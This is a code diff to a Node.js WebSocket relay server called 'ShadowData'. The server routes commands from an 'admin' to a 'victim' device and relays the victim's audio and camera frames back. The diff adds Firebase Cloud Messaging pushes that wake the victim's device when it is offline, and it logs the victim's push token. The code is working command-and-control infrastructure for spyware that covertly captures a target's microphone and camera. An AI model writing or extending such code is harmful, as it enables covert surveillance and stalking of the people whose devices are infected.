@@ -1,6 +1,18 @@
 const express = require('express');
 const { WebSocketServer, WebSocket } = require('ws');
 const http = require('http');
+const admin = require('firebase-admin');
+
+// Initialize Firebase Admin SDK (Make sure your service account key json is set up or environment variables configured)
+if (!admin.apps.length) {
+    try {
+        admin.initializeApp({
+            credential: admin.credential.cert(JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT || '{}'))
+        });
+    } catch (e) {
+        console.warn("Firebase Admin SDK initialization skipped or failed: ", e.message);
+    }
+}
 
 const app = express();
 const server = http.createServer(app);
@@ -9,18 +21,23 @@ const wss = new WebSocketServer({ server });
 let victimSocket = null;
 let adminSocket = null;
 
+// Store the victim's latest FCM token when registered
+let latestVictimFcmToken = process.env.VICTIM_FCM_TOKEN || "";
+
+app.use(express.json());
+
 app.get('/', (req, res) => {
     res.send(`ShadowData Relay Server Active.<br>Victim Connected: ${!!victimSocket}<br>Admin Connected: ${!!adminSocket}`);
 });
 
-// Heartbeat interval to keep Render WebSocket connections alive (Fixed interval syntax)
+// Heartbeat interval to keep Render WebSocket connections alive
 const interval = setInterval(() => {
     wss.clients.forEach((ws) => {
         if (ws.isAlive === false) return ws.terminate();
         ws.isAlive = false;
         ws.ping();
     });
-}, 30000); // Correctly passed as the second argument to setInterval
+}, 30000);
 
 wss.on('connection', (ws, req) => {
     ws.isAlive = true;
@@ -43,33 +60,67 @@ wss.on('connection', (ws, req) => {
         console.log('>>> Admin connected successfully.');
     }
 
-    ws.on('message', (message, isBinary) => {
-    // Check if the message is text or binary safely using ws library's second parameter (isBinary)
-    // or fallback to Buffer.isBuffer(message)
-    const binaryFlag = typeof isBinary !== 'undefined' ? isBinary : Buffer.isBuffer(message);
+    ws.on('message', (message) => {
+        const isBinary = Buffer.isBuffer(message);
+        const logContent = isBinary ? `[Binary/Frame Buffer: ${message.length} bytes]` : message.toString();
 
-    if (binaryFlag) {
-        // Route binary frames directly without string conversion
+        // Handle Admin trigger commands when victim socket is offline/disconnected
+        if (role === 'admin' && (logContent === 'TRIGGER_NOTIFICATIONS' || logContent === 'WAKE_UP')) {
+            console.log(`-> Received admin trigger command: ${logContent}`);
+            
+            if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
+                // If victim is currently online, just forward it through the socket
+                victimSocket.send(message);
+            } else {
+                console.log('-> Victim offline. Dispatches Firebase Cloud Messaging wake-up push...');
+                
+                if (latestVictimFcmToken) {
+                    const fcmPayload = {
+                        token: latestVictimFcmToken,
+                        data: {
+                            action: logContent
+                        },
+                        android: {
+                            priority: 'high'
+                        }
+                    };
+
+                    admin.messaging().send(fcmPayload)
+                        .then((response) => {
+                            console.log('Successfully sent FCM trigger push:', response);
+                            if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
+                                adminSocket.send("STATUS:WAKEUP_PUSH_SENT");
+                            }
+                        })
+                        .catch((error) => {
+                            console.error('Error sending FCM trigger push:', error);
+                            if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
+                                adminSocket.send(`ERROR:FCM Push failed - ${error.message}`);
+                            }
+                        });
+                } else {
+                    if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
+                        adminSocket.send("ERROR:No registered FCM token found for victim.");
+                    }
+                }
+            }
+            return;
+        }
+
+        // Avoid spamming logs with continuous audio/camera frame chunks
+        if (!logContent.startsWith('AUDIO_FRAME:') && !logContent.startsWith('CAMERA_FRAME:')) {
+            // Check if message contains a registered FCM token update from victim
+            if (logContent.startsWith('FCM_TOKEN:')) {
+                latestVictimFcmToken = logContent.substring(10).trim();
+                console.log('>>> Registered new victim FCM Token:', latestVictimFcmToken);
+                return;
+            }
+            console.log(`Received message from [${role}]: ${logContent.substring(0, 100)}...`);
+        }
+
         if (role === 'admin') {
             if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
-                victimSocket.send(message, { binary: true });
-            }
-        } else if (role === 'victim') {
-            if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
-                adminSocket.send(message, { binary: true });
-            }
-        }
-    } else {
-        // Handle text payloads (JSON, commands, or text-prefixed frames like AUDIO_FRAME:)
-        const textMessage = message.toString();
-
-        if (!textMessage.startsWith('AUDIO_FRAME:') && !textMessage.startsWith('CAMERA_FRAME:')) {
-            console.log(`Received text from [${role}]: ${textMessage.substring(0, 100)}...`);
-        }
-
-        if (role === 'admin') {
-            if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
-                victimSocket.send(textMessage);
+                victimSocket.send(message);
             } else {
                 console.log('-> ROUTING FAILED: Victim socket is null or not OPEN.');
                 if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
@@ -78,11 +129,10 @@ wss.on('connection', (ws, req) => {
             }
         } else if (role === 'victim') {
             if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
-                adminSocket.send(textMessage);
+                adminSocket.send(message);
             }
         }
-    }
-});
+    });
 
     ws.on('close', () => {
         if (ws === victimSocket) {
